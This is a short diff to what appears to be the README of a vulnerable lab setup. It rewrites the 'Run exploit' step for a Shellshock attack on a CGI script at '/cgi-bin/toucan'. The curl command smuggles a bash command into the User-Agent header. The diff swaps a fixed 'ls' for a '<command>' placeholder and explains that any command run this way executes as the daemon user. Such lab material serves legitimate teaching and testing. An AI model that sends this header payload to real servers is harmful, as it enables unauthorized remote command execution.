@@ -49,5 +49,6 @@ services:
 
 ### Run exploit:
 ```
-curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls ../htdocs;'" http://<ip address>/cgi-bin/toucan
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '<command>'" http://<ip address>/cgi-bin/toucan
 ```
+Set the <ip address> or hostname of the server to run the exploit on. The Shellshock exploit is invoked by changing the user agent to include a variant of `() { :; };` and replacing `<command>` with any command that will now be executed as the daemon user.
